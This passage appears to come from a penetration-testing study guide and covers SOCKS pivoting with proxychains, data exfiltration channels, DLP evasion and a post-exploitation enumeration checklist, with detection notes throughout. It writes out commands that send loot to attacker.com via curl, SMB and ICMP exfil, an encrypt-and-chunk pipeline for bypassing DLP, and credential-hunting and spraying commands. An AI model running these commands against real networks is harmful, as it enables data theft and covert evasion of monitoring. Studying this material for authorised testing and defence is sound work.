If you use Metasploit, `run autoroute -s 10.10.20.0/24` + the `socks_proxy` module does the same job (see Section 7).

### 12.4.4 proxychains configuration and the mandatory -sT -Pn

To run an external tool over a SOCKS proxy (Chisel/SSH -D), `proxychains` is used:

```
# last line of /etc/proxychains4.conf:
#   socks5 127.0.0.1 1080
# choose strict_chain or dynamic_chain; enable proxy_dns when needed
proxychains nmap -sT -Pn -p 445,3389,5985 10.10.20.0/24
proxychains crackmapexec smb 10.10.20.0/24
proxychains xfreerdp /v:10.10.20.5
```

**`why -sT -Pn are required`:** A SOCKS proxy forwards only **fully established TCP connections**. Nmap's default **SYN scan (`-sS`)** produces raw packets and uses a half-open connection → SOCKS cannot carry this, which is why **`-sT` (TCP connect)** is required. **`-Pn`** disables host discovery (ICMP ping/ARP) because ICMP does not pass through the proxy; without `-Pn`, nmap thinks the hosts are "down" and does not scan at all. A UDP scan also does not work over SOCKS.

**Detection/Defense (all pivot techniques):** A pivot creates unusual **east-west traffic** in the internal network: SMB/RDP/WinRM attempts from one workstation to another, long-lived outbound connections (Chisel/Ligolo C2), tunnels inside DNS/HTTP. NDR/IDS (Zeek, Suricata), host firewall segmentation, egress filtering, and beaconing analysis detect it. Defense: network segmentation/micro-segmentation, close unnecessary ports between internal hosts, whitelist outbound connections.

**Note:** nmap over a SOCKS pivot = **`proxychains nmap -sT -Pn`**. `-sS`, `-sU`, OS detection (`-O`), and ping sweep **do not work** over SOCKS. Do not confuse the reverse vs. forward direction: to get past egress it is almost always **reverse** (the target connects to you).

## 12.5 Data exfiltration (exfiltration)

Data exfiltration = taking the seized sensitive data out of the network **without being detected**. The channel choice is made according to the target's egress filter and DLP maturity.

### 12.5.1 Channels

| Channel | Tool / Method | Advantage | Disadvantage |
| --- | --- | --- | --- |
| **HTTP/HTTPS POST** | `curl -X POST`, web shell, C2 | Looks legitimate; content hidden inside TLS; port 443 always open | Proxy/TLS-inspection can catch it |
| **DNS tunneling** | `dnscat2`, `iodine` | DNS is almost always open/unmonitored, gets past egress | Very slow; high entropy/volume is detected |
| **ICMP tunneling** | `icmpsh`, `ptunnel` | Passes if the firewall allows ICMP | Slow; the echo payload volume is abnormal |
| **SMB / FTP** | `smbclient`, `impacket-smbserver`, `ftp` | Large files; natural in the internal network | External SMB/FTP is usually blocked; logged |
| **Cloud storage** | S3/Drive/Dropbox API, `rclone` | TLS + trusted domain → little suspicion | Requires an API key/account |

```
# exfil a file over HTTP/HTTPS POST:
curl -X POST --data-binary @loot.tar.gz https://attacker.com/u
curl -F "file=@loot.tar.gz" https://attacker.com/upload        # multipart
# Base64-encode it on a single line:
base64 -w0 loot.tar.gz | curl -X POST -d @- https://attacker.com/u
# over SMB (impacket SMB server on the attacker side):
impacket-smbserver share /tmp/loot -smb2support           # attacker
copy C:\loot.zip \\10.10.14.5\share\                       # target (Windows)
# ICMP (icmpsh): on the attacker, disable the kernel ICMP reply, then listen:
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python icmpsh_m.py 10.10.14.5 10.10.20.5                    # attacker_ip target_ip
# hedefte: icmpsh.exe -t 10.10.14.5
```

**DNS tunneling (concept):** `dnscat2` (Ron Bowes) sets up an **encrypted (ChaCha20) bidirectional** C2/tunnel inside DNS queries; `iodine` carries full IP traffic over DNS (with an MD5 challenge-response). Both require that the **NS record** for a domain controlled by the attacker be pointed to the attacker's server. Reason for preference: most networks **do not filter outbound DNS**, so even if egress is completely closed, data leaks out through the internal DNS resolver.

### 12.5.2 Detection evasion and DLP bypass

Processing the raw data before exfiltrating it increases both reliability and stealth:

- **Compress:** `tar czf loot.tgz /data` to reduce size and speed up the transfer.
- **Encrypt:** `openssl enc -aes-256-cbc -salt -in loot.tgz -out loot.enc -k PASS` or `gpg -c` to **bypass DLP content inspection (credit card/SSN signatures)** because the content now looks random.
- **Chunk:** split a large file into small chunks (`split -b 1M`), send each chunk at a different time, to avoid the single-large-transfer alarm.
- **Rate limit / timing:** slow down with `--limit-rate`, spread across working hours and normal traffic (beaconing jitter), to avoid volume and timing anomaly detection.
- **Camouflage the channel:** mimic legitimate domains/ports (443), a normal User-Agent, and natural DNS names.

```
tar czf - /data | openssl enc -aes-256-cbc -k PASS | split -b 1M - chunk_
# send each chunk at different times over HTTPS POST (with jitter)
```

**DLP bypass concept:** DLP (Data Loss Prevention) looks for a sensitive pattern in content (credit card, TCKN/SSN, "confidential" label) and abnormal volume/channel. Encryption breaks the content signature; chunking + rate limiting breaks the volume threshold; use of an approved channel (cloud/HTTPS) breaks the channel rule. Key point: **encryption + small chunks + legitimate channel = makes DLP signature- and threshold-based detection harder.**

**Detection/Defense:** DNS tunneling is caught by unusual **TXT/NULL record volume**, high **query name entropy**, and excessive subdomain queries to a single domain (Zeek/Suricata, Sigma rules). An ICMP tunnel is an anomaly with a large/fixed echo payload. HTTPS exfil is seen with TLS inspection + egress DLP + beaconing analysis. Defense: egress filtering (only necessary ports), mandatory DNS through the internal DNS resolver + DNS logging, DLP, cloud access control (CASB), data volume/rate alarms.

**Note:** The DNS and ICMP channels are for **firewall/egress bypass** but are **very slow**, they are for small/covert C2 and leakage, not for large data. For large data, HTTPS/SMB/cloud is chosen. "The most covert but the slowest" = DNS tunneling.

## 12.6 Situational awareness checklist

On each newly seized host, gather the following situational awareness information to decide the next step (privesc, pivot, or exfil). This is the "where am I going" compass of post-exploitation.

```
# WHO AM I / WHICH PRIVILEGES
whoami /all        (Windows)      |   id ; sudo -l        (Linux)
# WHICH MACHINE / OS
hostname ; systeminfo             |   hostname ; uname -a ; cat /etc/os-release
# WHICH NETWORK AM I ON (for pivoting)
ipconfig /all ; route print ; arp -a   |   ip a ; ip route ; arp -a ; ss -tulpn
# WHICH CREDENTIALS EXIST (for lateral movement)
cmdkey /list ; saved passwords ; DPAPI   |   ~/.ssh ; ~/.*_history ; config files
# AM I IN A DOMAIN (see Section 14)
echo %USERDOMAIN% ; nltest /dsgetdc:   |   realm list ; cat /etc/krb5.conf
# WHICH MACHINES CAN I ACCESS (credential spray)
nxc smb 10.10.20.0/24 -u user -p pass  (netexec/crackmapexec)
# RUNNING SERVICES / INTERESTING SOFTWARE
netstat -ano ; tasklist /svc      |   ps aux ; netstat -tulpn
```

Every piece of information gathered determines the next move: high privilege/misconfiguration → **privesc**; internal subnet + unreachable host → **pivot**; sensitive data files → **exfil**; stored credential/hash → **lateral movement** (see Section 14).

**Detection/Defense:** When enumeration commands (`whoami`, `net`, `systeminfo`, `ipconfig`, `arp`, `nltest`, `tasklist`) are run in quick succession in a short time, they form **"discovery" behavior** (MITRE ATT&CK TA0007); EDR alerts on these command sets and on `net.exe`/`whoami.exe` density. Defense: command-line logging (**Event ID 4688** + process command line audit, Sysmon EID 1), PowerShell script-block logging (**EID 4104**), detection of unusual discovery tools.

**Common mistakes (summary):**

- The most common Linux privesc paths: **`sudo -l` + GTFOBins** and **SUID + GTFOBins** (don't forget `-p`). A kernel exploit is a last resort.
- CVE matching: **PwnKit=CVE-2021-4034 (pkexec)**, **Baron Samedit=CVE-2021-3156 (sudo)**, **DirtyPipe=CVE-2022-0847**, **DirtyCow=CVE-2016-5195**.
- On Windows, **when you see `SeImpersonatePrivilege` → Potato → SYSTEM** (modern: PrintSpoofer/GodPotato; old: JuicyPotato). **SeBackupPrivilege → read SAM/SYSTEM.**
- Unquoted service path, weak service/registry ACL, AlwaysInstallElevated, cmdkey/runas /savecred are the most common Windows misconfigurations.
- External tools over a SOCKS pivot: **`proxychains` + `-sT -Pn`** (SYN scan and ping do not work over SOCKS). To get past egress, a **reverse** tunnel.
- In data exfiltration, **DNS/ICMP = firewall bypass but slow**; for large data, HTTPS/SMB/cloud. Encryption + chunking + legitimate channel = DLP bypass.
